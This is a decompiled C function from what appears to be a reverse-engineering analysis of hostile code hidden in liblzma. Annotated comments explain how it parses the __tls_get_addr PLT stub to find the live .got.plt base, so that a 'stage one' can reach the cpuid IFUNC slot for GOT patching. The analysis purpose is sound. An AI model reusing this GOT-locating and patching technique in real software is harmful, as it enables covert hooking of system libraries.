// /home/kali/xzre-ghidra/xzregh/103FA0_resolve_gotplt_base_from_tls_get_addr.c
// Function: resolve_gotplt_base_from_tls_get_addr @ 0x103FA0
// Calling convention: __stdcall
// Prototype: void * __stdcall resolve_gotplt_base_from_tls_get_addr(elf_entry_ctx_t * entry_ctx)


/*
 * AutoDoc: Parses the relocated `__tls_get_addr` PLT entry to recover liblzma’s live `.got.plt` base. Starting from the `_Lx86_coder_destroy` anchor plus the cached
 * `got_base_offset`, it locates the stub, skips optional CET `ENDBR64` and MPX `BND` prefixes, verifies the `jmpq *disp32(%rip)` opcode, and applies the
 * resulting disp32 to compute the GOT base (the slot address minus the 0x18-byte reserved PLT header). The base pointer is cached in `ctx->got_ctx.tls_got_entry` so
 * stage one can stride to the cpuid IFUNC slot without rescanning the PLT.
 */

#include "xzre_types.h"

void * resolve_gotplt_base_from_tls_get_addr(elf_entry_ctx_t *entry_ctx)

{
  void *tls_get_addr_stub;
  BOOL has_endbr64_prefix;
  long jmp_opcode_offset;
  void *gotplt_base;
  
  // AutoDoc: Ensure the base offsets and opcode tag are refreshed before touching the PLT stub.
  seed_got_ctx_for_tls_get_addr_parse(entry_ctx);
  // AutoDoc: Pivot off `_Lx86_coder_destroy` plus the cached offset to land on liblzma’s `__tls_get_addr` PLT entry.
  tls_get_addr_stub = (void *)((long)&_Lx86_coder_destroy +
                   (_Llzma_block_uncomp_encode_0 - (entry_ctx->got_ctx).got_base_offset));
  // AutoDoc: Zero the cpuid slot bookkeeping so the subsequent pass always re-detects the live GOT slot.
  (entry_ctx->got_ctx).cpuid_got_slot = (void *)0x0;
  (entry_ctx->got_ctx).cpuid_slot_index = 0;
  // AutoDoc: Detect the 4-byte `endbr64` prologue so we know whether to skip it before checking the PLT opcode.
  has_endbr64_prefix = (ulong)(*(char *)((long)tls_get_addr_stub + 1) == '\x0f');
  jmp_opcode_offset = has_endbr64_prefix * 4;
  // AutoDoc: Skip the MPX `bnd` prefix (0xF2) when present so the opcode word check lands on `ff 25`.
  if (*(char *)((long)tls_get_addr_stub + has_endbr64_prefix * 4) == -0xe) {
    jmp_opcode_offset = jmp_opcode_offset + 1;
  }
  gotplt_base = (void *)0x0;
  // AutoDoc: Only trust the calculation when the opcode word matches `ff 25` (0x25ff+1), proving the PLT stub layout is intact.
  if ((void *)(ulong)(*(ushort *)((long)tls_get_addr_stub + jmp_opcode_offset) + 1 & 0xffff) ==
      (entry_ctx->got_ctx).tls_got_entry) {
    // AutoDoc: Apply the stub’s RIP-relative disp32 and subtract 0x18 (PLT-reserved GOT header) to recover the `.got.plt` base pointer.
    gotplt_base = (void *)((long)tls_get_addr_stub + jmp_opcode_offset + -0x12 + (ulong)*(uint *)((long)tls_get_addr_stub + jmp_opcode_offset + 2));
  }
  // AutoDoc: Cache the recovered `.got.plt` base so stage one can stride to the cpuid slot during GOT patching.
  (entry_ctx->got_ctx).tls_got_entry = gotplt_base;
  return tls_get_addr_stub;
}

